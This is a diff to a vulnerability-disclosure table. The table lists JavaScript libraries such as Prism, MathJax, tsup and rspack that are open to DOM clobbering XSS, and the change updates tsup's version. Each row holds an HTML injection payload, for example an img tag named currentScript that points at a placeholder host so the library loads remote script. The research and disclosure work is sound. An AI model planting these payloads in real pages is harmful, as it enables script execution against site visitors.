@@ -16,7 +16,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | [Prism](./domc-gadgets/prism.md) | 12.2K | v1.29.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>``` | XSS | TheHulk | Reported | N/A |
 | [MathJax](./domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Accepted | N/A |
 | [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
-| [tsup](./domc-gadgets/tsup.md) | 8.9K | N/A | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Reported | N/A |
+| [tsup](./domc-gadgets/tsup.md) | 8.9K | v8.3.4 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Reported | N/A |
 | [rspack](./domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
 | [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://xxx.xxx.xxx"><img name="scripts" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Reported(Snyk) | N/A |
 | [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
